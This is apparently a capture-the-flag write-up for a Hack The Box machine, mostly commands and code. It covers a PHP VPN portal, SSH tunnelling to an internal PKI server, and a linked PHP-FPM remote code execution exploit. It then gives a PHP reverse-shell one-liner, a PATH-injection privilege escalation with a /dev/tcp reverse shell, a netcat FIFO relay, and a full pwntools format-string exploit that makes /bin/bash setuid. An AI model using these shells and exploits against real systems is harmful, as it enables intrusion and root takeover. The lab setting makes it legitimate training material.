```php
www-data@web:/var/www/html/vpn$ cat panel.php 
<?php
require "header.php";

if($_SESSION['auth']!="GRANTED"){
        session_destroy();
        header("Location: index.php");
} else {
        if(isset($_POST['cn'])){
                $cn=preg_replace("/[^A-Za-z0-9 ]/", '',$_POST['cn']);
                header('Content-type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.$cn.'.ovpn"');
                $handle = curl_init();
                $url = "http://pki/?cn=".$cn;
                curl_setopt($handle, CURLOPT_URL, $url);
                curl_setopt($handle, CURLOPT_RETURNTRANSFER, true); 
                $output = curl_exec($handle); 
                curl_close($handle);
                echo $output;
                die();
        }
?>
<table width=100%><tr><td align=right><a href=actions.php?action=logout>-= logout =-</a></td></tr></table>
<center><h3>Static Inc.<br>Internal IT Support portal</h3><br><br>
<form name=vpn method=POST action="<?php echo $_SERVER['PHP_SELF'];?>"><table border=0 cellspacing=5 cellpadding=5>
<tr><td> Common Name = </td><td><input type=text name=cn></input></td><td><input type=submit value="Generate"></input></td></tr>
</table></form>
<br><br><br><br>
<table cellspacing=5 cellpadding=5>
        <tr><td><b>Server</td><td><b>Address</td><td><b>Status</td></tr>
        <tr><td>pub</td><td>172.17.0.10</td><td><font color=red>Offline</td></tr>
        <tr><td>web</td><td>172.20.0.10</td><td>Online</td></tr>
        <tr><td>db</td><td>172.20.0.11</td><td>Online</td></tr>
        <tr><td>vpn</td><td>172.30.0.1</td><td>Online</td></tr>
        <tr><td>pki</td><td>192.168.254.3</td><td>Online</td></tr>
</table>


<?php
}

?>
```


# SSH Tunel

http://pki is running on 192.168.254.3:80 

```bash
ssh -N -L 8010:192.168.254.3:80 -i www-data-id_rsa www-data@static-docker.htb
```

# RCE

https://github.com/neex/phuip-fpizdam

# Shell

* Copy NC binary to 192.168.254.2

* Run on .3 :
```bash
php -r '$sock=fsockopen("192.168.254.2",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```


# Method 1 - /usr/bin/ersatool
* Uses setuid, which is PATH injectable
 ```bash
# Run PATH Injection on PKI Server
export PATH = /tmp/:$PATH
echo -e '#!/bin/bash\n/bin/bash -l > /dev/tcp/192.168.254.2/9001 0<&1 2>&1' > /tmp/openssl

# Open NC Listener on 192.168.254.2 
# /tmp/./nc -nvlp 9001

# Run ersatool on pki server
/usr/bin/ersatool create foo
```


# Method 2 - Binary exploitation on /usr/bin/ersatool

### On Local run

- This will redirect 4242 port running on static.htb to our localhost:4242 through SSH
- Then it will create a fifo and read from 4243 and redirect to 4242

```bash
ssh -L 4242:127.0.0.1:4242 -i www-data-id_rsa -p 2222 www-data@static.htb
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.19.0-16-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Jun 28 16:35:50 2021 from 10.10.14.16
www-data@web:~$ cd /tmp
www-data@web:/tmp$ mkfifo pip
www-data@web:/tmp$ ./nc -nvlp 4243 < pip | ./nc -nvlp 4242 > pip
```

### On 192.168.254.3 run

- This will send the ersatool over TCP to 4243 on the 192.168.254.2 (machine above listening on 4243 and redirecting to our 4242)

```bash
/usr/bin/ersatool >& /dev/tcp/192.168.254.2/4243 0>&1
```

- ersatool running on 192.168.254.3 --> 192.168.254.2:4243 --> 127.0.0.1:4242

### Pwn

- Pwn script will attack 127.0.0.1:4242 which will redirect all the way back to 192.168.254.3 machine

```python
from pwn import *

context.arch = "amd64"
context.log_level = "INFO"

# See https://docs.pwntools.com/en/stable/fmtstr.html#example-automated-exploitation
def send_formatstr_payload(payload: bytes):
    log.debug(f"Sending format string payload {payload}")
    p.sendline(payload)
    return p.recvuntil(b"!\n")

#p = process("./ersatool")
p = remote("127.0.0.1",4242)
elf = ELF("./ersatool")
p.sendline("print")
p.recvregex("# print->CN=")

# Initialize format string exploiter
format_str = FmtStr(execute_fmt=send_formatstr_payload)

# Read stack offset 1, which is a pointer to EXT, otherwise known as the string ".ovpn"
leaked_EXT_PTR = format_str.leak_stack(1)
log.info(f"Leaked address of EXT: {hex(leaked_EXT_PTR)}")
# Rebase ELF representation using leaked adress
base = leaked_EXT_PTR - elf.symbols["EXT"]
elf.address = base
log.info(f"Leaked base address: {hex(base)}")

# Get /root/root.txt
leaked_OUTPUT_DIR = elf.symbols["OUTPUT_DIR"]
log.info(f"Leaked address of OUTPUT_DIR: {hex(leaked_OUTPUT_DIR)}")

format_str.write(leaked_EXT_PTR, '.txt')
format_str.execute_writes()
format_str.write(leaked_EXT_PTR+4, b'\x00\x00\x00\x00')
format_str.execute_writes()
format_str.write(leaked_OUTPUT_DIR,'/roo')
format_str.execute_writes()
format_str.write(leaked_OUTPUT_DIR+4,b't\x00\x00\x00')
format_str.execute_writes()
format_str.write(leaked_OUTPUT_DIR+8,b'\x00\x00\x00\x00')
format_str.execute_writes()

# Lets get shell
leaked_ERSA_DIR = elf.symbols["ERSA_DIR"]
command = "chmod u+s /bin/bash;#"
nullBytes = len(command)%4

# Fill the command with nullbytes at the end
for j in range(0,nullBytes):
	command+="\x00"
	
# Split command every 4 bytes
for index in range(0, len(command), 4):
	format_str.write(leaked_ERSA_DIR+index,command[index : index + 4])
	format_str.execute_writes()
	
p.interactive()
```
